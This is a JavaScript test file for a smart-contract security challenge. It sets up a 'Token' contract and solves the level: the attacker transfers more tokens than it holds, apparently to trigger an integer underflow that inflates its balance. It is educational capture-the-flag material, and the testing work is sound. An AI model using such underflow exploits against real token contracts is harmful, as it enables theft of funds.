const { ether, expectRevert, expectEvent, } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');

const Token = contract.fromArtifact('Token');

const { expect } = require('chai');

describe('[Challenge] Token', function () {

  const [deployer, attacker, someUser, ...otherAccounts] = accounts;

  before(async function () {
    /** SETUP SCENARIO */
    this.token = await Token.new('20', { from: attacker });
  });

  it('Exploit', async function () {
    /** YOUR EXPLOIT GOES HERE */
    await this.token.transfer(someUser, '21', { from: attacker });

  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    // let attackerBalance = await this.token.balanceOf(attacker);
    // console.log(parseInt(attackerBalance));

    // let someUserBalance = await this.token.balanceOf(someUser);
    // console.log(parseInt(someUserBalance));

    expect(await this.token.balanceOf(attacker)).to.be.bignumber.gt('20');
  });
});
